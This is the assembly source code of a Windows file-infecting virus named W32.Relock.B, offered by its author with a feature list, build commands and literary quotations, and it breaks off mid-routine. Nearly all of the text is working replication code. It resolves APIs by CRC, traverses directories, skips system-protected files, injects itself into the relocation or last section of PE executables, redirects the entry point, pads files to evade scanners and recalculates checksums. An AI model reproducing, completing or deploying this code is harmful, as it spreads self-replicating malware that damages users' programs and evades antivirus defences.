comment ;)
W32.Relock.B by roy g biv

some of its features:
- parasitic resident (own process) infector of PE exe (but not looking at suffix)
- infects files in current directory and all subdirectories
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- weird EPO (entry point is altered but no replication happens there)
- uses CRCs instead of API names
- uses SEH for common code exit
- section attributes are never altered (virus is not self-modifying)
- no infect files with data outside of image (eg self-extractors)
- no infect files protected by SFC/SFP (including under Windows XP)
- infected files are padded by random amounts to confuse tail scanners
- uses SEH walker to find kernel address (no hard-coded addresses)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm

yes, just a W32.Relock remake that works on Windows 7
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 relock
tlink32 /B:400000 /x relock,,,import32

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.386
.model  flat

extern  MessageBoxA:proc
extern  ExitProcess:proc

.data
include relock.inc

dropper         label   near
        push    ebx
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        mov     edx, dllcrc_count
        mov     ebx, offset dllnames
        mov     edi, offset dllcrcbegin
        call    create_crcs
        pop     ebx
        jmp     relock_execode
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

relock_inf      proc    near
        xor     eax, eax
        push    dword ptr fs:[eax]
        mov     dword ptr fs:[eax], esp
        enter   (size findlist - 5) and -4, 0   ;Windows NT/2000/XP enables alignment check exception
                                                ;so some APIs fail if buffer is not dword aligned
                                                ;-5 to align at 2 dwords earlier
                                                ;because EBP saved automatically
                                                ;and other register saved next
        push    eax                             ;zero findprev in findlist
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     eax, dword ptr [eax + mlDllBase]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near
        dd      (krncrc_count + 1) dup (0)

;-----------------------------------------------------------------------------
;get SFC support if available
;-----------------------------------------------------------------------------

        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)
        db      "RELOCk - roy g biv"            ;to boldly go where no code has gone before

load_sfc        label   near
        call    dword ptr [esp + krncrcstk.kLoadLibraryA]
        test    eax, eax
        jne     found_sfc
        push    'cfs'                           ;Windows 2000
        push    esp
        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
        pop     ecx
        test    eax, eax
        je      sfcapi_push

found_sfc       label   near
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near
        dd      0, 0
        pop     eax

sfcapi_push     label   near
        push    eax
        mov     ebp, esp
        lea     esi, dword ptr [ebp + size krncrcstk]

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
        push    '*'                             ;ANSI-compatible Unicode findmask
        mov     eax, esp
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        push    eax
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
        pop     ecx
        mov     dword ptr [esi + findlist.findhand], eax
        inc     eax
        je      find_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
        je      find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   find_next
        push    size findlist
        push    GMEM_FIXED
        call    dword ptr [esp + krncrcstk.kGlobalAlloc + 8]
        xchg    ecx, eax
        jecxz   step_updir
        xchg    esi, ecx
        mov     dword ptr [esi + findlist.findprev], ecx
        jmp     scan_dir

find_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        mov     edi, dword ptr [esi + findlist.findhand]
        push    edi
        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

        mov     ebx, esp
        push    edi
        call    dword ptr [ebx + krncrcstk.kFindClose]

find_prev       label   near
        mov     ecx, dword ptr [esi + findlist.findprev]
        jecxz   relock_exit
        push    esi
        mov     esi, ecx
        call    dword ptr [ebx + krncrcstk.kGlobalFree]

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        org     $ - 1                           ;select top 8 bits of push
relock_exit     label   near
        int     3                               ;game over

        push    esp
        call    dword ptr [ebx + krncrcstk.kSetCurrentDirectoryA]
        pop     eax
        jmp     find_next

test_file       label   near

;-----------------------------------------------------------------------------
;get full path
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        mov     eax, ebp
        enter   MAX_PATH * 2, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    ecx
        push    MAX_PATH
        push    edi
        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
        xchg    edi, eax
        pop     eax
        xor     ebx, ebx

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
        xor     eax, eax                        ;fake success in case of no SFC
        jecxz   leave_sfc
        push    esp
        push    ebx
        call    ecx

leave_sfc       label   near
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ or GENERIC_WRITE
        push    edi
        call    dword ptr [ebp + krncrcstk.kCreateFileW]
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        push    eax
        sub     eax, 8
        push    eax
        push    0
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kSetFileTime + 10h]
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kCloseHandle + 4]

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        call    set_fileattr
        jmp     find_next
scan_dir        endp

init_kernel32   label   near
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     eax, dword ptr [eax + mlDllBase]

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports   label   near
        pop     edi
        xchg    ebx, eax
        mov     esi, dword ptr [ebx + mzhdr.mzlfanew]
        mov     esi, dword ptr [ebx + esi + pehdr.peexport.dirrva]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        scas    dword ptr [edi]
        jmp     edi

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        push    edi
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
        ret                                     ;edi -> filename
        db      "01/08/12"                      ;they said it couldn't be done
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
        mov     ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;no .dll files this time
;-----------------------------------------------------------------------------

        test    ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        jne     inftest_ret
        add     esi, pehdr.peentrypoint - pehdr.pecoff.petimedate
        lods    dword ptr [esi]
        xchg    ecx, eax

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], eax
        jnbe    inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
        add     eax, edx
        mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pecodebase]
        mov     edx, dword ptr [esi + pehdr.peimagebase - pehdr.pecodebase]
        lea     esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        add     dword ptr [ebp + findlist.finddata.dwFileSizeLow], ebx
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        call    dword ptr [esp + size mapstack - 4 + krncrcstk.kGetTickCount]
        and     eax, RANDPADMAX - 1
        add     ax, small (offset relock_codeend - offset relock_inf + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
        cdq
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        push    eax
        mov     ecx, esp
        push    eax                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    edx
        push    eax
        push    edx
        push    PAGE_READWRITE
        push    edx
        push    ebx
        call    dword ptr [ecx + size mapstack + krncrcstk.kCreateFileMappingA]
                                                ;ANSI map is allowed because of no name
        push    eax
        xchg    edi, eax
        call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
        call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;infect file in two parts
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               entry point is altered to point to some code.  very simple
;               however, that code just drops exe and returns
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        xor     ecx, ecx
        imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
        add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        mov     cx, offset relock_codeend - offset relock_inf
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        add     edx, dword ptr [esi]
        add     edi, edx

;-----------------------------------------------------------------------------
;section attributes are always altered to executable because for Windows XP SP2
;you can remove that bit, if you want, but we need the writable bit for RNG
;-----------------------------------------------------------------------------

        or      byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h
        mov     esi, 14000h
        rep     movs byte ptr [edi], byte ptr [esi]

;-----------------------------------------------------------------------------
;alter entry point
;-----------------------------------------------------------------------------

        add     ebp, offset relock_execode - offset relock_inf
        xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], ebp
        add     ebp, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        mov     dword ptr [edi + offset host_patch - offset relock_codeend + 1], ebp
        pop     edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        cdq
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     dx, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], edx            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

;-----------------------------------------------------------------------------
;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura
;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence
;asm port and size optimise by rgb in 2002
;-----------------------------------------------------------------------------

randinit        proc    near                    ;eax = seed, ecx = 0, edi -> RNG cache
        pushad
        push    edi
        or      eax, 1
        mov     ecx, statelen

init_loop       label   near
        stos    dword ptr [edi]
        mov     edx, 69069
        mul     edx                             ;Knuth label   near x_new = x_old * 69069
        loop    init_loop
        inc     ecx                             ;force reload
        call    initdelta

initdelta       label   near
        pop     edi
        add     edi, offset randvars - offset initdelta
        xchg    ecx, eax
        stos    dword ptr [edi]
        pop     eax
        stos    dword ptr [edi]
        stos    dword ptr [edi]
        popad
        ret
randinit        endp

random          proc    near
        pushad
        call    randelta

randvars        label   near
        db      'rgb!'                          ;numbers left
        db      'rgb!'                          ;next pointer
        db      'rgb!'                          ;state pointer

randelta        label   near
        pop     esi
        push    esi
        lods    dword ptr [esi]
        xchg    ecx, eax
        lods    dword ptr [esi]
        xchg    esi, eax
        loop    random_ret
        mov     cx, statelen - period
        mov     esi, dword ptr [eax]
        lea     ebx, dword ptr [esi + (period * 4)]
        mov     edi, esi
        push    esi
        lods    dword ptr [esi]
        xchg    edx, eax
        call    twist
        pop     ebx
        mov     cx, period - 1
        push    ecx
        push    ebx
        call    twist
        pop     esi
        push    esi
        inc     ecx
        call    twist
        xchg    edx, eax
        pop     esi
        pop     ecx
        inc     ecx

random_ret      label   near
        lods    dword ptr [esi]
        mov     edx, eax
        shr     eax, tshiftU
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftS
        and     eax, tmaskB
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftT
        and     eax, tmaskC
        xor     eax, edx
        mov     edx, eax
        shr     eax, tshiftL
        xor     eax, edx
        pop     edi
        mov     dword ptr [esp + 1ch], eax      ;eax in pushad
        xchg    ecx, eax
        stos    dword ptr [edi]
        xchg    esi, eax
        stos    dword ptr [edi]
        popad
        ret
random          endp

twist           proc    near
        lods    dword ptr [esi]
        push    eax
        add     eax, eax                        ;remove highest bit
        add     edx, edx                        ;test highest bit
        rcr     eax, 2                          ;merge bits and test lowest bit
        jnb     twist_skip                      ;remove branch but larger using label   near
        xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx

twist_skip      label   near
        xor     eax, dword ptr [ebx]
        add     ebx, 4
        stos    dword ptr [edi]
        pop     edx
        loop    twist
        ret
twist           endp

        ;When last comes to last,
        ;  I have little power:
        ;  I am merely an urn.
        ;I hold the bone-sap of myself,
        ;  And watch the marrow burn.
        ;
        ;When last comes to last,
        ;  I have little strength:
        ;  I am only a tool.
        ;I work its work; and in its hands
        ;  I am the fool.
        ;
        ;When last comes to last,
        ;  I have little life.
        ;  I am simply a deed:
        ;an action done while courage holds:
        ;  A seed.
        ;(Stephen Donaldson)

relock_execode  proc    near
host_patch      label   near
        push    offset do_message               ;replaced dynamically
        pushad
        call    init_kernel32

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

dllcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (dllcrc_count + 1) dup (0)
        mov     ebx, esp
        call    dword ptr [ebx + dllcrcstk.dGetTickCount]
        enter   (statelen + 1) shl 2, 0         ;RNG cache
        mov     edi, esp
        call    randinit
        push    (offset relock_codeend - offset relock_inf) + 1
        push    GMEM_ZEROINIT
        call    dword ptr [ebx + dllcrcstk.dGlobalAlloc]
        push    eax
        push    ((offset relock_codeend - offset relock_inf) * 255 * 2) + exesize
        push    GMEM_ZEROINIT
        xchg    esi, eax
        call    dword ptr [ebx + dllcrcstk.dGlobalAlloc]
        push    eax
        push    esi
        call    skip_exe
        dd      11111110010011000101110000110001b
;               mmmmmmmz  04mmz  02mmmz  01mz  02
        db      'M', 'Z', 'e', 's', '.', 'd', 'l', 'l', 'P', 'E', 4ch, 1, 2, 2
        dd      00001110011010000111111000101010b
;               z  01mmz  06mz  01mmmmmz  02mz 08
        db      26h, 60h, 6ch, 2, 3, 0bh, 1, 6, 80h
        dd      00011100110100101110000110001110b
;               z  03mz  06mz  05mmz  01mz  03m
        db      40h, 0ch, 0feh, 0ffh, 10h, 2
        dd      01010101011100111101111010001010b
;               z  0amz  0bmz  07mz  0fz  08mz 08
        db      5, 0e0h, 2, 6
        dd      00011110101110001110111011010011b
;               z  03mmz  0bmz  03mz  0emmz  09m
        db      8, 60h, 50h, 10h, 0deh, 60h, 0e0h
        dd      01101100110101111000111001100000b
;               z  0dmz  06mz  0fz  03mz  06
        db      60h, 1, 40h
        dd      0

exesize equ     0e6h
;RLE-based compressed MZ header, PE header, section table, relocation table

;decompressed data follow
;       db      'M', 'Z'                ;00
;       db      "es.dll", 0             ;02    dll name
;       db      3 dup (0)               ;09    align 4
;       db      'P', 'E', 0, 0          ;0c 00 signature (overload for import lookup table rva)
;       dw      14ch                    ;10 04 machine (overload for import lookup table RVA and date/time stamp)
;       dw      2                       ;12 06 number of sections
;       dd      2                       ;14 08 date/time stamp (overload for dll name rva)
;       dd      6026h                   ;18 0c pointer to symbol table (overload for import address table rva)
;       dd      0                       ;1c 10 number of symbols
;       dw      6ch                     ;20 14 size of optional header
;       dw      302h                    ;22 16 characteristics
;       dw      10bh                    ;24 18 magic
;       dd      80000006h               ;26 1a major linker, minor linker, size of code (overload for import name table)
;       dd      0                       ;2a 1e size of code, size of init data (overload for import name table terminator)
;       dw      0                       ;2e 22 size of init data
;       dd      0                       ;30 24 size of uninit data
;       dd      4000h                   ;34 28 entry point
;       dd      0                       ;38 2c base of code
;       dd      0ch                     ;3c 30 base of data (overload for lfanew)
;       dd      0fffe0000h              ;40 34 image base
;       dd      1000h                   ;44 38 section align
;       dd      200h                    ;48 3c file align
;       dw      0                       ;4c 40 major os
;       dw      0                       ;4e 42 minor os
;       dw      0                       ;50 44 major image
;       dw      0                       ;52 46 minor image
;       dw      5                       ;54 48 major subsys
;       dw      0                       ;56 4a minor subsys
;       dd      0                       ;58 4c reserved
;       dd      (aligned size of code)  ;5c 50 size of image
;       dd      exesize - 6             ;60 54 size of headers
;       dd      0                       ;64 58 checksum
;       dw      2                       ;68 5c subsystem
;       dw      0                       ;6a 5e dll characteristics
;       dd      0                       ;6c 60 size of stack reserve
;       dd      0                       ;70 64 size of stack commit
;       dd      0                       ;74 68 size of heap reserve
;       dd      0                       ;78 6c size of heap commit
;       dd      0                       ;7c 70 loader flags
;       dd      6                       ;80 74 number of rva and sizes
;       dd      0                       ;84 78 export
;       dd      0                       ;88 7c export
;       dd      6008h                   ;8c 80 import
;       dd      0                       ;90 84 import (overload for section name)
;       dd      0                       ;94 88 resource (overload for section name)
;       dd      5000h                   ;98 8c resource (overload for virtual size)
;       dd      1000h                   ;9c 90 exception (overload for virtual address)
;       dd      0                       ;a0 94 exception (overload for file size)
;       dd      0                       ;a4 98 certificate (overload for file offset)
;       dd      0                       ;a8 9c certificate (overload for pointer to relocs)
;       dd      60deh                   ;ac a0 base reloc (overload for pointer to line numbers)
;       dd      reloc size              ;b0 a4 base reloc (overload for reloc table and line numbers)
;       dd      0e0000000h              ;b4 a8 debug (overload for section characteristics)
;       dd      0                       ;b8 ac debug (overload for section name)
;       dd      0                       ;bc b0 architecture (overload for section name)
;       dd      0                       ;c0 b4 architecture (overload for virtual size)
;       dd      6000h                   ;c4 b8 global data (overload for virtual address)
;       dd      section size            ;c8 bc global data (overload for file size)
;       dd      1                       ;cc c0 tls (overload for file offset)
;       dd      0                       ;d0 c4 tls (overload for pointer to relocs)
;       dd      0                       ;d4 c8 load config (overload for pointer to line numbers)
;       dd      0                       ;d8 cc load config (overload for reloc table and line numbers)
;       dd      40000000h               ;dc d0 bound imports (overload for section characteristics, reloc page rva)
;       dw      0                       ;e0 d4 bound imports (overload for reloc page rva)
;       dd      reloc size              ;e2 d6 iat (overload for reloc block size)
;                                       ;e6

skip_exe        label   near
        pop     esi
        xchg    edi, eax
        xor     ecx, ecx
        cdq

;-----------------------------------------------------------------------------
;decompress dll MZ header, PE header, section table, relocation table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        shld    ecx, eax, 4
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        lea     eax, dword ptr [esi + offset relock_inf - offset skip_exe]
        xchg    ebx, eax
        pop     esi
        push    edi
        mov     edi, (offset relock_codeend - offset relock_inf) + 1
        push    edi
        push    GMEM_ZEROINIT
        call    dword ptr [eax + dllcrcstk.dGlobalAlloc]
        xchg    edi, eax
        xchg    ecx, eax
        xchg    esi, ebx
        push    ecx
        push    edi
        rep     movs byte ptr [edi], byte ptr [esi]
        xchg    ecx, eax
        pop     esi
        pop     ecx
        pop     edi
        dec     ecx                     ;don't encode dummy byte
        push    esi
        dec     eax

inc_codebits    label   near
        inc     eax

get_codebits    label   near
        xor     ecx, ecx
        cmp     byte ptr [esi + eax], cl
        je      inc_codebits
        push    eax
        mov     edx, eax
        add     ah, 10h
        stos    word ptr [edi]
        sub     byte ptr [esi + edx], 3
        push    edx

relhigh_carry   label   near
        inc     edx
        db      0d6h
        sbb     byte ptr [esi + edx], cl
        lahf
        sub     byte ptr [ebx + edx], al
        sahf
        jb      relhigh_carry
        pop     edx
        inc     byte ptr [ebx + edx]
        call    random
        and     al, 1
        je      skip_mips32
        cmp     edx, offset relock_codeend - offset relock_inf - 3
        jnb     skip_mips32
        cmp     byte ptr [esi + edx + 1], 0c0h
        jb      skip_mips32
        mov     ecx, dword ptr [ebx + edx]
        xor     cl, cl
        inc     ecx
        loop    skip_mips32
        mov     eax, edx
        add     ah, 50h
